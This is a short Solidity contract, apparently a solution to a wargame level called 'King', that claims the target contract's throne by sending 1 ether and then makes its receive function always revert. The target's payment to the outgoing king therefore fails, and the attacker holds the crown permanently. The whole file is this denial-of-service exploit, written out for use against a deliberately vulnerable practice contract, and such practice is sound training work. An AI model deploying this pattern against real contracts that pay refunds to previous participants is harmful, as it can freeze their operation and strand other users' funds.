// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./9-King.sol";

contract KingAttacker {
    address payable public kingAddress;

    constructor(address payable _kingAddress) public payable{
        kingAddress = _kingAddress;
    }

    function getCrown() public {
        (bool sent,) = kingAddress.call{value: 1 ether}("");
        require(sent, "Your transaction failed!");
    }

    receive() external payable {
        revert("I won't relinquish!");
    }

}